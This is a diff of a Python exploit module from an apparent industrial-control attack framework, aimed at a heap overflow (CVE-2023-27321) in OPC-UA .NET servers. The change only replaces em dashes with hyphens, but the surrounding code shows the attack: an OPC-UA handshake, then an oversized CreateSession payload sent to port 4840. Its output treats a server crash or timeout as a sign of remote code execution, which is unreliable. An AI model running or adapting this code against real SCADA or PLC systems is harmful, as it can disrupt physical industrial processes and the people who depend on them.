@@ -1,4 +1,4 @@
-"""IXF ICS CVE Module — CVE-2023-27321 (OPC Foundation UA .NET Stack Heap Overflow).
+"""IXF ICS CVE Module - CVE-2023-27321 (OPC Foundation UA .NET Stack Heap Overflow).
 
 Heap overflow in the OPC Foundation UA .NET Stack triggered by a crafted
 CreateSession request. Affects all OPC-UA servers and applications built on
@@ -20,7 +20,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "CVE-2023-27321 — OPC Foundation UA .NET Stack Heap Overflow",
+        "name":             "CVE-2023-27321 - OPC Foundation UA .NET Stack Heap Overflow",
         "description":      "Heap overflow in OPC Foundation UA .NET Stack via crafted CreateSession request. Pre-auth, affects all .NET-based OPC-UA servers including many SCADA/DCS/PLC OPC-UA interfaces.",
         "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":       (
@@ -34,7 +34,7 @@ class Exploit(Exploit):
             "Siemens SINEMA, GE iFIX, Aveva, Inductive Automation Ignition (when .NET OPC-UA)",
         ),
         "impact":           "CRITICAL",
-        "exploit_type":     "Heap Overflow — Pre-Auth RCE",
+        "exploit_type":     "Heap Overflow - Pre-Auth RCE",
         "cve":              "CVE-2023-27321",
         "cvss":             "9.8",
         "severity":         "CRITICAL",
@@ -44,8 +44,8 @@ class Exploit(Exploit):
 
     target      = OptIP("", "Target OPC-UA server IP")
     port        = OptPort(4840, "OPC-UA port (default 4840)")
-    simulate    = OptBool(False, "Simulate — describe exploit without connecting")
-    destructive = OptBool(False, "Enable live exploitation — requires authorization")
+    simulate    = OptBool(False, "Simulate - describe exploit without connecting")
+    destructive = OptBool(False, "Enable live exploitation - requires authorization")
 
     @mute
     def check(self):
@@ -81,12 +81,12 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "CVE-2023-27321 — OPC Foundation UA .NET Stack Heap Overflow\n"
+                    "CVE-2023-27321 - OPC Foundation UA .NET Stack Heap Overflow\n"
                     "CVSS 9.8 (CRITICAL) | CWE-122 Heap-based Buffer Overflow\n\n"
                     "Step 1: TCP connect to OPC-UA server port 4840\n"
                     "Step 2: Send OPC-UA HEL (Hello) message\n"
                     "Step 3: Receive ACK from server (confirms OPC-UA endpoint)\n"
-                    "Step 4: Send OPN (Open Secure Channel) — unsecured mode\n"
+                    "Step 4: Send OPN (Open Secure Channel) - unsecured mode\n"
                     "Step 5: Send malformed CreateSession request:\n"
                     "       - SessionName field: 65536 bytes (>> heap allocation)\n"
                     "       - Triggers heap overflow in UA-.NETStandard parser\n"
@@ -120,17 +120,17 @@ class Exploit(Exploit):
 
             ack = sock.recv(32)
             if not ack or ack[:3] != b"ACK":
-                print_warning("[CVE-2023-27321] No ACK — target may not be OPC-UA or uses different protocol")
+                print_warning("[CVE-2023-27321] No ACK - target may not be OPC-UA or uses different protocol")
                 sock.close()
                 return
-            print_success("[CVE-2023-27321] OPC-UA ACK received — server confirmed")
+            print_success("[CVE-2023-27321] OPC-UA ACK received - server confirmed")
 
-            # Step 2: OPN (Open Secure Channel) — None security
+            # Step 2: OPN (Open Secure Channel) - None security
             # Simplified OPN for heap overflow delivery
             # In production: full BinaryDecoder ASN.1 CreateSession
             session_name_overflow = b"S" * 65536   # overflow the heap
 
-            # CreateSession request body (simplified — real would need full UA encoding)
+            # CreateSession request body (simplified - real would need full UA encoding)
             create_session = (
                 b"\x00\x00\x00\x00"    # AuthToken (NodeId null)
                 + struct.pack("<I", len(session_name_overflow))
@@ -147,13 +147,13 @@ class Exploit(Exploit):
             try:
                 resp = sock.recv(512)
                 if resp:
-                    print_success(f"[CVE-2023-27321] Response received — heap overflow may have executed ({len(resp)} bytes)")
+                    print_success(f"[CVE-2023-27321] Response received - heap overflow may have executed ({len(resp)} bytes)")
                 else:
-                    print_success("[CVE-2023-27321] No response after overflow — server may have crashed (RCE indicator)")
+                    print_success("[CVE-2023-27321] No response after overflow - server may have crashed (RCE indicator)")
             except TimeoutError:
-                print_success("[CVE-2023-27321] Timeout after overflow — heap corruption likely triggered")
+                print_success("[CVE-2023-27321] Timeout after overflow - heap corruption likely triggered")
         except ConnectionRefusedError:
-            print_warning(f"[CVE-2023-27321] Port {self.port} refused — OPC-UA server not running")
+            print_warning(f"[CVE-2023-27321] Port {self.port} refused - OPC-UA server not running")
         except Exception as exc:
             print_error(f"[CVE-2023-27321] Error: {exc}")
         finally:
